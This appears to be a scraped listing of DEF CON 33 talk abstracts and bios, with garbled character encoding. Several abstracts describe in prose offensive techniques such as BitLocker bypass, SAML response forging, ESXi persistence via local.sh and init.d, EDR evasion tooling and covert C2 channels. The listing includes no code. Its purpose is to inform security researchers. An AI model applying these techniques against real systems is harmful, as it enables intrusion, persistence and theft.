<p>His work has won a variety of awards, including a 2016 Pwnie for Best Cryptographic Attack and multiple best/distinguished papers at top security conferences. He is also the winner of six teaching awards including a national level award for his intro to algorithms course.</p>

<p>Past work has included a fellowship with Senator Ron Wyden and a summer stint at the FTC working on public policy.
His academic bio won't say this, but he has a history of getting into (only the right sorts of) trouble.</p>

<p>Iâm sure youâve heard of MIDI â itâs a protocol and file format thatâs used to exchange audio generation data such as ânote onâ and ânote offâ events. But what if I told you that thereâs a MIDI implementation out there in the wild that, when excited in just the right ways, can do stuff the original product designers never intended to do? In this talk, weâll dive into the wonderful world that is hardware reverse engineering. Weâll explore what JTAG and UART are and how we can use them to hack modern digital devices. Weâll dump the firmware of a Yamaha music keyboard and discover what is essentially a backdoor in the MIDI implementation â and exploit it to play Bad Apple on the keyboardâs dot matrix LCD.</p>

<font size=""+1""><strong>Description:</strong></font><br>
<p>In Windows, the cornerstone of data protection is BitLocker, a Full Volume Encryption technology designed to secure sensitive data on disk. This ensures that even if an adversary gains physical access to the device, the data remains secure and inaccessible.</p>

<p>One of the critical aspects of any data protection feature is its ability to support recovery operations failure cases. To support BitLocker recovery, design changes were applied in the Windows Recovery Environment (WinRE). This led us to a pivotal question: did these changes introduce new attack surfaces impacting BitLocker? </p>

<p>In this talk, we will share our journey of researching a fascinating and mysterious component: WinRE. Our exploration begins with an overview of the WinRE architecture, followed by a retrospective analysis of the attack surfaces exposed with the introduction of BitLocker. We will then discuss our methodology for effectively researching and exploiting these exposed attack surfaces. Our presentation will reveal how we identified multiple 0-day vulnerabilities and developed fully functional exploits, enabling us to bypass BitLocker and extract all protected data in several different ways.</p>

<p>Finally, we will share the insights Microsoft gained from this research and explain our approach to hardening WinRE, which in turn strengthens BitLocker.</p>

<font size=""+1""><strong>Description:</strong></font><br>
<p>Modern web applications donât just expose APIs, they expose attack paths. Recursive Request Exploits (RRE) are a new class of attack that weaponizes interdependent web requests to systematically bypass authentication, authorization, and payment controls.</p>

<p>This talk introduces RRE, a methodology that automates recursive request discovery, maps hidden relationships between API and web calls, and exploits overlooked logic flaws. Using a real-world case study, weâll show how this technique was used to bypass premium paywalls on a major streaming platform without requiring authentication or hacking DRM.</p>

<p>But this isnât just a one-off streaming exploit, RRE exposes a fundamental flaw in how checkout logic is enforced across e-commerce and digital subscriptions. By chaining requests together in unintended ways, attackers can exploit blind spots in authentication, entitlement, and payment flows to gain unauthorized access. What was once considered security through obscurity is now an active attack surface.</p>

<p>Weâll release exploit code, via a Burp Suite extension, that automates RRE discovery and exploitation, giving security professionals the tools to both weaponize and defend against these attacks.</p>

<font size=""+1""><strong>Description:</strong></font><br>
<p>OPC UA is a standardized communication protocol that is widely used in the areas of industrial automation and IoT. It is used within and between OT networks, but also as a bridge between IT and OT environments or to connect field systems with the cloud. Traditionally, VPN tunnels are used to secure connections between OT trust zones (especially when they cross the internet), but this is often considered not to be neccessary when using OPC UA because the protocol offers its own cryptographic authentication and transport security layer.</p>

<p>This makes OPC UA a valuable target for attackers, because if they could hijack an OPC UA server they might be able to wreak havoc on whatever industrial systems are controlled by it. </p>

<p>I decided to take a look at the cryptography used by the protocol, and managed to identify two protocol flaws which I could turn into practical authentication bypass attacks that worked against various implementations and configurations. These attacks involve signing oracles, signature spoofing padding oracles and turning ""RSA-ECB"" into a ""timing side channel amplifier"".</p>

<p>In this talk, I will explore the protocols and the issues I identified, as well as the process of turning two theoretical crypto flaws into highly practical exploits.</p>

Instead of relying on LLMs or black-box AI, it uses explainable machine learning to map alerts, logs, and telemetry to MITRE ATT&amp;CK techniques, cluster them into contextualized attack steps, and chain them into complete killchains. Built for blue teamers and SOC analysts, it's lightweight, interpretable, and easy to deploy in real environments. This demo will show how the tool processes real-world-style data, generates actionable tickets, and supports root cause analysis. If you're drowning in false positives or lone incidents, this is for you.</p>

<p>SAMLSmith is the go-to tool for penetrating SAML applications with response forging. An evolution of the original tooling developed for proof-of-concept of SAML response forging in Entra ID, SAMLSmith is the product of continued research on SAML. While far from new, enterprises continue to not prioritize the security of how SaaS applications integrate or understand best practices for securing them. With many factors at play, SAML response forging can range from extremely difficult to near impossible for a SOC to detect. SAMLSmith has a lot of tricks up its sleeve, including: [1] Multiple identity provider response forging. [2] AD FS specific response forging mode. [3] SAML request processing. [4] InResponseTo support. SAMLSmith can be used in several response forging scenarios where the private key material can be obtained. In demonstration of use, weâÃÃ´ll explore using SAMLSmith for performing a Golden SAML attack against AD FS. Further, weâÃÃ´ll demonstrate the use of SAMLSmith that ties into new research around response forging, penetrating certain types of SaaS applications with even more stealth.</p>

<p>Every time the lights go out, the speculation beginsâwas it cyber? Squirrels? Was it an attack? But often, the real story behind grid disturbances isnât malicious codeâitâs uncontrolled chaos, born from the physical behavior of a rapidly evolving power system.
This session takes a deep dive into that chaos, exploring how subtle interactions in electric gridsâlike oscillationsâcan spiral into large-scale instability. These low-frequency oscillations are increasingly common in the bulk electric system, yet are explainable. They emerge from control design, network conditions, and energy physicsânot adversarial action, and the lights going off is usually a sign the system has actually acted as it should in protecting itself from damage. Equipment failures are also spectacular,  but common.   Its tempting to tie big fires to bad cyber,  but in reality â the failures are almost always in the planning for the event, or recovery. <br />
Weâll dissect real-world events like the Iberian Peninsula blackout, where what looked like a grid failure may have actually revealed a quiet success: a functional blackstart scenario, where system operators re-energized the grid under extreme stress. But that nuance was lost in the noise, as media and analysts scrambled for cyber scapegoats. Weâll also explore the London transformer fire, a failure in planning for an outage,  and technical scrutiny of Chinese-manufactured inverter components with alleged kill switches inserted, illustrating how physical system dynamicsâoften create the most dramatic disruptions.
This talk fuses power system engineering, ICS cybersecurity, and operational storytelling to reframe how we interpret complex events. Itâs a call to replace fear with factsâand to find meaning in the chaos, not just blame.</p>

In early 2024, after standing up for others, I was banned and ostracized from the local cybersecurity communities in my home country. At the time, I had never spoken at a conference outside that community â I hadnât even attended DEF CON as an attendee. At first, it felt like the end of everything, because that local community meant the world to me back then. But then I stopped and asked myself:</p>

<p>âWhy not create my own world â one filled with light?ââ¨
âI shall shine bright to light the way, even in the darkest night.â
The best revenge is to shine bright and live your best life.
Now, let there be light â in the world of bits and bytes.</p>

I'll show the techniques I used at each stage to get quick answers to its capabilities.</p>

<p>You know how to secure and break systems - but what about the laws and policies that govern them? Whether you like it or not, cybersecurity is now deeply entangled with law and politics. Governments are making decisions about encryption, vulnerability disclosure, surveillance, and the limits of offensive operations - decisions that shape what you can build, break, publish, or patch.
What you need is a fast-paced, no-jargon-needed crash course in cyber policy, designed specifically for DEF CON attendees. We'll start early: the crypto wars (no, not that crypto), hacking laws, and security research. From there, we'll look at how todayâs key institutions - legislatures, federal agencies, international coalitions - are approaching the future of cybersecurity. Topics include the debate over vulnerability disclosure and use, efforts to regulate encryption and mandate software security, the evolving norms of state-sponsored hacking, AI policyâs impact on cybersecurity, post-quantum encryption, and conflicts over digital sovereignty. Finally, weâll cover how you can engage on these debates.
If you've ever found yourself yelling at a Congressional hearing on C-SPAN or ignoring it entirely, this talk will help you understand how the levers of cyber policy work - and how you can hack them, too.</p>

<font size=""+1""><strong>Description:</strong></font><br>
<p>Over the past decade and a half, the tactics of threat actors have quietly but fundamentally transformed. What began as slow, targeted intelligence gathering has evolved into automated, scalable exploitation of exposed assetsâoften before defenders even notice. In this keynote, weâll trace the journey of threat actor innovation, highlighting shifts in recon methods, asset targeting, and speed of attack. Weâll dissect common attack surface mistakes that open the door for breaches, especially in the last couple of years, and challenge assumptions around visibility and control. The attack surface is always in motionâare you keeping up?</p>

<font size=""+1""><strong>Description:</strong></font><br>
<p>Open-source intelligence in Discord may seem surface level. Some techniques include searching through chat history using search operators similar to Google dorking and reviewing a userâs profile to look for any linked accounts tied to their Discord account. Going beyond this and analyze the servers that a user is a part of, more assumptions and inferences can be made based on those servers. I applied what I saw and experienced with Student Hubs and applied it to cybersecurity within Discord. The information from knowing what cybersecurity servers a person is in informed me of what their experience level was, the type of field they were interested / worked in, and potentially even where they lived.<em>x000D</em>
<em>x000D</em>
However, you can only reach a certain point by joining servers within Discord. This type of approach can only be done at scale and this presents its own set of problems. Scaling this seemed unlikely to happen until a service known as Spy.pet was publicly disclosed in April 2024. Spy.pet was marketed as a data broker that was inadvertently a very capable OSINT tool that could be used for Discord. Knowing that it would be available for a short time before it got shut down, I was able to access Spy.pet to use and document what capabilities it had. Since then, there have been more data scrapers that have appeared with their own reasons. These include third-parties (malicious or not), academic researchers, and cybercrime groups. I will cover the capabilities and OPSEC failures from some of the data scrapers in the past year as well as how it could possibly be approached in the future. Most importantly, I will go over protections at the user and server level.</p>

<p>Hi, Iâm Megan Allen.</p>

<p>My work focuses on a holistic approach to health; moving the bodyâs natural energy into alignment with Earth and the seven chakras. I practice integrative wellness - honoring a person's emotional, mental, physical and spiritual well-being. I provide intuitive healing sessions and work with clients to relax the mind, increase body awareness and balance energy flow.</p>

<p>I also facilitate community wellness workshops, ceremonies and transformational group programs inviting participants to disconnect from their busy lives, turn inward and tap into the present to restore and maintain the bodyâs energetic balance and cultivate self-love, empowerment and sovereignty.</p>

<p>I inspire people to activate their highest potential in alignment with their wise hearts and to promote healing from within. I tailor my sessions to reflect this; using techniques from my healing disciplines as well as my love for Traditional Chinese Medicine, holistic aromatherapy, crystals and essential oils, tarot, animal medicine cards and a deep reverence for nature.</p>

<p>Nature is one of my greatest teachers. It constantly teaches me about grounding, stability, resilience, boundaries, growth, and stillness.</p>

<p>Purple teaming is no longer just about red meets blue, it is about shared intelligence, continuous collaboration, and realistic adversary emulation. In this panel, we explore how modern security teams are moving from siloed operations to unified strategies that reflect how real attackers operate. By rethinking purple teaming as a proactive, intelligence-driven discipline, organizations can uncover detection gaps, improve response times, and drive measurable improvements in their defenses. Join us as we unpack how aligning offensive and defensive teams unlocks the full potential of purple teaming and leads to lasting security impact.</p>

<p>Weâre stuck in a cycle of bug bounties, vulnerability reports, and endless patching - yet the same issues keep resurfacing. Even after years of ""shifting left"", vulnerabilities still reach production, keeping security teams in firefighting mode.</p>

<p>What if we could eliminate entire bug classes instead of fixing them one by one?</p>

<p>This talk explores how modern browser security features can automate and scale protection - without relying solely on developers to remember best practices. Opt-in mechanisms like Content Security Policy v3, Trusted Types, and Sec-Fetch-Metadata offer powerful defenses against XSS, CSRF, clickjacking, and cross-origin attacks.</p>

<p>We'll show how these new, underused browser capabilities - which simply didnât exist a few years ago - enable secure-by-default architectures. Real-world examples will demonstrate practical integration strategies, automated security headers, secure defaults, and ways to track adoption and impact. </p>

<p>This talk presents a streamlined approach to Dynamic Application Security Testing (DAST) in the Secure Software Development Life Cycle (SSDLC). By integrating DAST directly into existing Selenium-based web tests and using ZAProxy, the traditional complex setup - such as URL parsing and authentication - is avoided. 
The proposed method leverages functional test coverage to better isolate vulnerabilities and simplifies setup by configuring the proxy in browser features. 
This integration provides earlier security feedback and increases the efficiency of vulnerability detection compared to traditional spider-based testing, proving it to be a more practical and effective alternative.</p>

Abstract:<br />
As FIN groups continue to execute fast-impact ransomware campaigns, Nation-State APT's prefer long-term infrastructure control, and in both instances: hypervisors have become the new high ground. This talk will explore a set of stealthy and reliable persistence techniques targeting VMware ESXi, developed and refined through our hands-on research and real-world incident analysis.<br />

<p>Iâll break down five practical persistence mechanisms that allow adversaries to remain resident in virtualized environments (even through reboots, patching cycles, and partial remediation efforts). These include:</p>

<p>â¢        Payload injection via local.sh and profile.local
â¢        Malicious services in /etc/init.d
â¢        Symlink hijacking of trusted binaries (like esxcli)
â¢        Custom VIB (vSphere Installation Bundle) creation and implantation</p>

<p>While some of these techniques have been observed in malware families like BadVIBes, VIRTUALPITA, and VIRTUALPIE, a couple others represent novel techniques weâve weaponized in our lab environments but remain largely unobserved in the wild. Every approach is designed to leverage Living-off-the-Land (LOTL) native binaries and config paths, turning ESXiâs minimalism into an attackerâs advantage.</p>

<p>This talk will walk through each method with technical depth, LOTL payload examples, and visual demonstrations. Iâll also explore follow-on actions post-compromise such as ESXi firewall manipulation/DNS reconfiguration to facilitate stable C2 channels.
If you're responsible for red team ops, adversary emulation, or just curious how attackers achieve deep infrastructure persistence, this session will show you a few different ways to persist beneath the hypervisor.</p>

Our virtual RFCTF can be played completely remotely without needing any specialized equipment at all, just using your web browser! The key is to read the clues, determine the goal of each challenge, and have fun learning.</p>

<p>This game doesn't let you sit still either, as there are numerous fox hunts, testing your skill in tracking various signals. If running around the conference looking for WiFi, Bluetooth, or even a Tire Pressure Monitoring System (TPMS) device sounds like fun, we are your source of a higher step count.</p>

<p>There will be clues everywhere, and we will provide periodic updates via discord and twitter.

<p>Virtualization Based Security (VBS) is one of the most fascinating security advancements of recent years - the ability to isolate critical components of the OS enabled Microsoft to achieve substantial security improvements with features like Credential Guard and HVCI. </p>

<p>One of the more interesting features enabled through VBS are VBS Enclaves - a technology that allows a process to isolate a region of its memory, making it completely inaccessible to other processes, the process itself, and even the kernel. </p>

<p>While VBS enclaves can have a wide range of security applications, they can also be very appealing to attackers - running malware in an isolated region, out of the reach of EDRs and security analysts? Sign us up! </p>

<p>With this research we set out to explore the concept of enclave malware. We will dive into VBS enclaves while exploring previously undocumented behaviors, and describe the different scenarios that can enable attackers to run malicious code inside enclaves.</p>

<p>We will then work towards weaponizing VBS enclaves - we will describe the different techniques that could be used by malware running within enclaves, and show how they enable creating stealthy implants that can go completely undetected.</p>

<p>A long time ago, browsers were wrappers for HTTP web requests and little else. The modern browser, however, is crammed with so many features that it is practically an operating system. This talk will demonstrate how to (ab)use years of legacy features along with recent additions to Google Chrome to mimic the capabilities of a conventional C2 implant while evading traditional endpoint protection.</p>

<p>We will introduce our new open-source framework ""ChromeAlone"" which implements features such as proxying raw TCP traffic, phishing for Yubikey USB codes, dumping cookies and credentials, keylogging browser windows, and executing shell commands from Chrome. Our implementation leverages Chrome's built-in features, sideloads malicious components without user interaction, and obfuscates code using WebAssembly to evade detection. This research exposes significant security implications of Chrome's expanding feature set and the challenges of securing modern browsers against abuse.</p>

<p>BOAZ (Bypass, Obfuscate, Adapt, Zero-Trust) evasion was inspired by the concept of multi-layered approach which is the evasive version of defence-in-depth first proposed in a presentation at BH USA14. BOAZ was developed to provide greater control over combinations of evasion methods, enabling more granular evaluations against antivirus and EDR. It is designed to bypass before, during, and post execution detections that span signature, heuristic, and behavioural detection mechanisms. BOAZ supports both x86/x64 binary (PE) or raw payload as input and output EXE or DLL. It has been tested on separated Windows 11 Enterprise, Windows 10, and Windows Server 2022 VMs with 14 desktop AVs and 7 EDRs installed including Windows Defender, Norton, BitDefender, Sophos, and ESET. The design of BOAZ evasion is modular, so users can add their own toolset or techniques to the framework. BOAZ is written in C++ and C and uses Python3 as the main linker to integrate all modules. There have been significant improvements implemented since its inception. The new version of the BOAZ evasion tool, set for release at DEF CON 33, will feature three novel threadless process injection primitives, along with newly implemented loaders and behavioural evasion techniques.</p>

LetâÃÃ´s stop doing that. LetâÃÃ´s share the fun! C4 (Cross-Compatible Command &amp; Control) is here to change that. ItâÃÃ´s a modular toolkit of WASM-powered plugins that makes external C2 easy to implement, regardless of your implant's language or target OS. Whether youâÃÃ´re writing in C, Rust, Go, Python, C#, or something else entirely, C4 plugins can be loaded directly into your implant and run on Windows, macOS, or Linux. But the real game-changer? C4 provides a single, centralized collection of over 10 fully-documented, operationally-ready external C2 modules âÃÃ® not just proof-of-concepts, but production-level integrations with trusted sites that fly under the radar. No more hunting through GitHub repos, hand-rolling fragile API calls, or hacking together glue code for every new environment. Stop reinventing external C2 and start planting some C4 in your implants!</p>

<p>AGo malware is showing up more often, especially in IoT environments. Its flexibility and ease of cross-compilation make it attractive to attackers, but it also makes life harder for analysts and defenders. Go binaries are large, statically compiled, and structured in ways that traditional tools are not designed to handle. The runtime is unfamiliar, and things like string extraction, function identification, and behavior analysis can quickly become frustrating.  This talk looks at why Go malware is hard to analyze and why some detection tools struggle to keep up. We will walk through practical tips and tools to make reversing Go malware more manageable, including how to recover types, strings, and function information.  To tie everything together, we will look at a recent real-world example: Pumabot, a Go-based botnet targeting IoT surveillance devices. We will dig into how it works, what it targets, and what artifacts it leaves behind. By the end of the session, you will have a better understanding of how attackers are using Go in the wild and how to be better prepared for the next time it shows up in your analysis queue.</p>

<p>In recent years, ransomware has been one of the most prolific forms of cybercrime with financial gain as primary motive. The problem keeps getting bigger with a new operation seeing the light almost every month. While reverse engineering ransomware is fun, it also serves a greater purpose: can we find a vulnerability that allows us to decrypt a victimâs files without interacting with the criminals? Enter the DoNex ransomware, a new operation that has entered the scene very recently. They have a leak website on the dark web where some victims have been named and shamed. Reverse engineering of a DoNex sample revealed a vulnerability that allowed us to decrypt every encrypted file for victims under a trivial condition. To help victims recover from a ransomware attack, we published a decryption tool on the NoMoreRansom platform, an initiative from a number of parties including the Dutch National Police to keep ransomware operators from extorting victims. In this talk, we will dive into the technical details of DoNex and how we exploited a vulnerability to decrypt files affected by DoNex without the need to negotiate with the cybercriminals.</p>

<p>The Android virtualization technique allows an app to create independent virtual environments running on top of the Android native one, where multiple apps can be executed simultaneously. While the technique has legitimate uses, attackers have identified ways to exploit it. According to the state-of-art, virtualization-based malware is a significant threat: researchers have found 71,303 malicious samples. Defence mechanisms have already been developed to find virtualization-based malware and to detect or prevent virtualization-based repackaging attacks.In this paper, we offer three key contributions. First, we experimentally evaluate the existing defence mechanisms by identifying their limitations and demonstrating how they can be bypassed. Second, we design and develop a new defence mechanism, called Matrioska, that overcomes the limitations of the state-of-art by detecting the intrinsic features of the virtualization technique. Third, we evaluate the effectiveness of Matrioska with respect to the state-of-art against two datasets of apps. Overall, Matrioska achieves a higher accuracy (99% vs. 71%) when searching for virtualization usage and a lower false positive (10 vs. 23) and false negative rate (14 vs. 39) when detecting a virtualization-based repackaging attack.</p>

<p>Mobile apps today depend heavily on Runtime Application Self-Protection (RASP) to stay secure while running. But attackers are getting smarter. Theyâre finding new ways to slip past these defenses by going deeper into the mobile operating system and targeting the kernel itself.</p>

<p>This session takes you inside that world. Weâll explore how attackers manipulate mobile kernels to bypass modern RASP protections. Through a mix of easy-to-follow explanations and live demos, youâll see how these techniques work in real time. From understanding the basics of kernel architecture to spotting vulnerabilities and using memory manipulation to stay hidden, weâll cover it all.</p>

<p>By the end, youâll walk away with a clear understanding of how these evasions work and what you can do to defend against them.

<font size=""+1""><strong>Description:</strong></font><br>
<p>The payment fraud landscape is experiencing a resurgence of 'carding' through sophisticated Near Field Communication (NFC) relay attacks, which combine social engineering and custom mobile malware to bypass contactless payment security measures, enabling unauthorized transactions. A critical emerging trend is the proliferation of Malware-as-a-Service (MaaS) platforms, primarily operated by Chinese-speaking threat actors, who develop and distribute advanced NFC relay capabilities as turn-key solutions to global affiliates, facilitating complex card-present fraud schemes on an unprecedented scale and leading to arrests in the U.S. and EU. This MaaS operational model, featuring affiliate networks and advanced tools, signifies a critical evolution in financial threats, alarming global financial institutions and necessitating urgent adaptation of fraud prevention strategies. The discussion will explore MaaS operations, presenting key findings from the Supercard X analysis, including its technical capabilities, and examining the implications for the payment industry, with mitigation strategies and actionable intelligence such as actor communications and distinct Tactics, Techniques, and Procedures (TTPs) being shared. Furthermore, the talk will reveal how developers of well-known Android banking trojans are integrating NFC relay functionalities to enhance their cash-out techniques, providing attendees with a deep dive into NFC Relay MaaS, exclusive threat intelligence, and an understanding of the evolving fraud landscape, including the operational models, tools, and TTPs employed by modern NFC Relay MaaS platforms, as well as the systemic risks posed to global financial institutions and the urgent need for adaptive security postures.</p>

<p>In this talk I'll describe our investigation of ad-hoc, proprietary EMV features from Apple, Google, Samsung and Square and show that companies independently retrofitting and over-loading the core EMV specification has led to a range of security problems. Along the way I'll show how we managed to do unauthenticated, over-the-limit, offline payments for Mastercard and ultimately take 25000 from an EMV terminal with no payment card at all.Â  On the defense side I'll discuss how formal modeling can make EMV payments safer and I'll describe our distance bounding amendment to the ISO 14443 standard that could make all EMV payments safer.</p>

<font size=""+1""><strong>Description:</strong></font><br>
<p>The federal government builds and maintains hundreds of thousands of software systems - and it would be difficult to find a system that doesn't rely on open source software. In fact, the government is likely the single largest consumer of OSS in the world and considering the criticality of the mission, the security of those systems is paramount. There has been limited guidance on how government programs should select, consume, contribute to, and publish open source software, but things are getting better! This session will discuss the current landscape of open source in the federal government and present methods for how we can secure our own systems with tools and processes to vet open source projects, ingest that software securely, and support those projects with substantive contributions.</p>

<p>Attendees from government entities, contractors, and members of the community should attend to learn how the government can tackle the supply chain risks inherent in open source while still capturing the benefits that it has to offer. They'll come away with an understanding of how this might impact their work, and how by working together we can build a better open source ecosystem for everyone.</p>

<font size=""+1""><strong>Description:</strong></font><br>
<p>Cyberpunk authors, like Neal Stephenson in Snow Crash, have long envisioned a world run by ruthless mega-corporations, with more power than governments, engaging in threat activity. We now live in such a world. Tech companies wield immense, often invisible power, far beyond what they admit to users. Weâve caught glimpses:</p>

<p>â¢ A cloud provider scanning customer data for offensive content
  â¢ A rideshare app tracking users after the ride ends
  â¢ A robotic vacuum that builds maps of your home 
  â¢ A respected security company bricking systems across the globeâ¦ accidentally</p>

<p>These arenât theoretical. Theyâre the tip of the iceberg. The real capabilities, the ones no one talks about, are far more dangerous.</p>

<p>Governments know it. Thatâs why some ban certain apps and hardware.
Threat actors know it. Thatâs why they break in.
The question is: do you know whatâs really possible?</p>

<p>This talk explores the dark potential of modern tech platforms, the things theyâre structurally able to do, whether or not they intend to. Weâll walk through scenarios where companies might be tempted to go offensive, where insiders (or outsiders) could gain and weaponize access, and how these powers could be misused at scale.</p>

<p>Because in security, itâs never about what a system claims to do.
Itâs about what it can do.</p>

<font size=""+1""><strong>Description:</strong></font><br>
<p>The Digital Markets Act (DMA) is a landmark European law which aims to make digital markets fairer and open. The DMA regulates the behaviour of âgatekeepersâ: large digital players whose closed platforms may limit innovation and choice for users. The DMA sets out âdoâs and donâtsâ, such as enabling interoperability, allowing alternative services (e.g. browsers or app stores), and treating third parties on equal footing. </p>

<p>In this presentation, you get to hear first-hand from the DMA enforcers about their experience, focusing on the first-ever enforcement action taken under the DMA. In March 2025, the European Commission spelled out how Apple must make iOS and iPadOS work seamlessly with third-party products and services, in particular connected devices such as smartwatches and headphones. We provide insights into how we delivered this concrete change, how the security community played a useful role, and what the benefits will be for developers and users. </p>

<p>We give a perspective on how the DMA preserves system integrity, security and user privacy when introducing interoperability to a previously closed platform. We also give a broader outlook on what other benefits businesses and end users can expect from the DMA, especially in terms of giving users full control and choice over their devices and data.</p>

<p>Imagine discovering critical intelligence hidden inside live video streams faster than any human analyst could. We'll begin with a compelling hypothetical scenario: a breaking news livestream unintentionally captures crucial clues about a missing person's location, but overwhelmed human investigators miss the moment. Inspired by real world challenges investigators face daily, this scenario motivated us to build Autonomous Video Hunter (AVH), a system of AI powered agents that scour video content in real time to extract actionable OSINT.<em>x000D</em>
<em>x000D</em>
Technical core:<em>x000D</em>
We'll showcase how AVH combines open source AI models for image recognition and audio transcription, orchestrated by custom Python based agents. These agents autonomously analyze video streams, detect critical visuals, logos, speech keywords, and quickly cross reference these clues against online databases and OSINT repositories.<em>x000D</em>
<em>x000D</em>
Live demo:<em>x000D</em>
Experience AVH live as it identifies a target logo and relevant context (e.g., social media profiles and geolocation clues) from a random video clip in mere seconds. We'll also address practical challenges, from reducing false positives to scaling efficiently across multiple simultaneous streams.<em>x000D</em>
<em>x000D</em>
By the end of this lightning talk, attendees will understand how autonomous agents transform overwhelming video data into OSINT insights rapidly and effectively. We'll also share a lightweight open source AVH tool for the OSINT community to use and build upon.</p>

<p>For those who find it hard to dive into something new alone, we will be offering small tour groups to take people around to various villages, contests and communities. We will meet in the LVCC West Hall - South Entrance, look for the butterfly logo banner! We will then leave for the village/contest/event/community as a group, hang out there for 15 minutes or so, and then you may choose to return to the lobby with the group or stay in the village. We are NOT members of where we are going to tour, we are all finding out about the cool things at DEF CON together.</p>

<p>Max 20 attendees since hardware is included for free.</p>

<p>Want to play with an open-source messaging system that has been deployed to space for a number of on-orbit projects?</p>

<p>In this workshop, you will work with a toolkit designed to create flexible and secure digital interactions across distributed systems while also eliminating common problems associated with consistency, availability, and partitioning of these systems and architectures. We'll walk you through compiling, configuring, and deploying a simple distributed wireless messaging application on our ESP32 badge board. Once it's flashed and working, the hardware is yours! Then dig deeper to learn the mechanisms that make Aranya work and make your own modifications.</p>

<p>The badge board you will receive is a multi-purpose development board based on the ESP32-S3 with 2MB PSRAM and 4MB Flash. It provides battery management, USB-C, two Qwiic ports, microSD, a big RGB notification LED, and a big tactile button. Battery included! For more information, <a href=""https://github.com/aranya-project/demo-board-v2"">check out the repo</a>.</p>

<p>Toolz: A Mac or Linux machine (WSL will work) and a USB type-C cable. Chrome or Python for the front-end.</p>

<p>Skillz: Familiarity with command-line tools. Understanding Rust, Embassy, and esp-rs will be handy, but not required.</p>

<p>Business logic vulnerabilities in APIs are often design oversights that lead to dangerous outcomes. They occur when attackers abuse legitimate API behavior to bypass controls or exploit workflows. In this talk, weâll share field experience developing behavioral analysis techniques that surface exploitable API behaviors at scale. </p>

<p>We developed a method for passively analyzing API responses - clustering similar logic flows and flagging anomalies that suggest potential abuse paths. Youâll see how business logic vulns manifest in real-world APIs, how attackers chain together valid actions to achieve unintended outcomes, and how defenders can catch these issues early. The session will conclude with practical strategies for integrating business logic awareness into threat modeling and CI/CD pipelines.</p>

<p>In the spirit of economic development, cities often compete for the attention of large corporate brands, especially """"Big Tech"""", to settle in their communities creating attractive incentives like tax-breaks and favorable construction terms. Residents in the affected communities get excited about the prospect of new jobs or career growth. With the recent explosion of the everyday use of Artificial Intelligence (AI) changing work and life as we know it in society, cities want to be known as technology leaders or at least early adopters. And in today's evolving world, one of Cybersecurity's main functions is to not only enable the business but also just as importantly managing risk for the business. As professionals, we have an obligation to ensure that solutions our organizations develop, especially those involving AI, promote benefits to not only the organization but also society and do not cause harm to the environment. In this session, we will explore Cybersecurity's role to understand potential and realized risks of accommodations to secure and implement """"Big Tech"""" initiatives in communities with respect to energy, water, and waste systems. Attendees will be exposed to the use of risk management frameworks to identify and mitigate these risks and drive sustainable outcomes as well as the situational applicability of ethics in the cybersecurity profession. Case studies and statistics will be citied from various real-world communities, including black communities. While some case discussed will be resolved with implemented remediations, others will be on-going with the opportunity to explore potential solutions.</p>

<p>âPublic access - offâ should mean safe, right? Not when a wildcard principal sneaks into Terraform or a quick-start template letting any logged-in account (yours, mine, or a strangerâs) access your sensitive data.</p>

<p>We ran a large-scale, cross-cloud hunt for this quiet misconfiguration, testing it in AWS, Azure and GCP and measuring how often it shows up in real environments. The flaw is sneaky: anonymous requests are getting blocked, yet any authenticated account can still perform actions such as list, get, or even put objects - so a quick browser check tricks you into thinking the bucket is private. Our data shows that more than 15% of cloud environments had at least one bucket publicly exposing sensitive data. As for the remaining 85%, ânot publicâ doesnât always mean private. Further analysis revealed that many of these supposedly restricted buckets still exposed sensitive information unintentionally, including configuration files, code, and AI models.</p>

<p>In this talk weâll outline our scan approach, present the headline numbers and walk through our methodology for detecting risky buckets.</p>

<p>We usually view the world of cybersecurity through the lens of a malicious attacker versus a legitimate actor within a given system. This approach fails when considering the world of data privacy where there are three actors in play: the possibly-benevolent vendor, the legitimate user and the inevitable malicious actor. Using this privacy-focused lens, we survey the current regulatory landscape before turning our attention to how privacy is (not) applied to the automotive world.</p>

<p>Our talk focuses on the unique privacy risks the automotive industry is facing with the advent of smart, connected, cars. We present a real-world case study showing how quickly and thoroughly a bad actor could invade the privacy of a car owner, based on a privacy leak vulnerability designated CVE-2025-26313 (reserved).</p>

<p>Catastrophic hardware failures. From an aging I/O device to cosmic ray bit flips, memory degradation to CPU fires. When an unrecoverable hardware error is detected, the common platform response is to generate a Machine Check Exception, and shut down before the problem gets worse.</p>

<p>In this talk, we'll see what happens when we circumvent all the traditional fail safes. What happens when, instead of exceptionally rare failures from natural causes, we deliberately create these fatal events from software. When instead of a platform shutdown, we force the system to limp along, damaged but alive. We'll show how carefully injecting these signals during privileged CPU operations can disrupt secure transitions, how those disruptions progress to cascading system failures, and how to ride the chaos to gain hardware privilege escalation. Finally, we'll see how to undo the damage, recover from the unrecoverable, and let the system continue as if nothing happened - now with a foothold in privileged space, all through hardware failure events synthesized through software-only attacks.</p>

<p>We'll conclude by showing how to use this vector to reveal all-new hardware vulnerabilities, and walk through a brave new world of machine check research opportunities - for both attackers and defenders - across technologies and architectures.</p>

<font size=""+1""><strong>Description:</strong></font><br>
<p>Red teams often struggle with interactive C2 in monitored networks. Low-and-slow channels are stealthy but insufficient for high-bandwidth tasks like SOCKS proxying, pivoting, or hidden VNC. Our research solves this by using real-time collaboration protocolsâspecifically, whitelisted media servers from services like Zoomâto create short-term, high-speed C2 channels that blend into normal enterprise traffic.</p>

<p>We introduce TURNt, an open-source tool that automates covert traffic routing via commonly trusted TURN servers. Since many enterprises whitelist these conferencing IPs and exempt them from TLS inspection, TURNt sessions look just like a legitimate Zoom meeting. Operators can maintain a persistent, stealthy channel while periodically activating higher-bandwidth interactivity for time-sensitive operations.</p>

<p>This talk will show how to set up these âghost calls,â discuss the trade-offs and detection challenges, and explore defensive countermeasures. Attendees will learn how to integrate short-term, real-time C2 into existing red team workflowsâand how to identify and mitigate this emerging threat.</p>

<p>PyTorch is a machine learning library based on the Torch library, used for applications such as computer vision and natural language processing. It is one of the most popular deep learning frameworks.</p>

<p>However, beneath its powerful capabilities lies a potential security risk. Initially, PyTorch used pickle to save models, but due to the insecurity of pickle deserialization, there was a risk of Remote Code Execution (RCE) when loading models. Subsequently, PyTorch introduced the weights_only parameter to enhance security. The official documentation states that weights_only=True is considered safe and recommends using it over weights_only=False.</p>

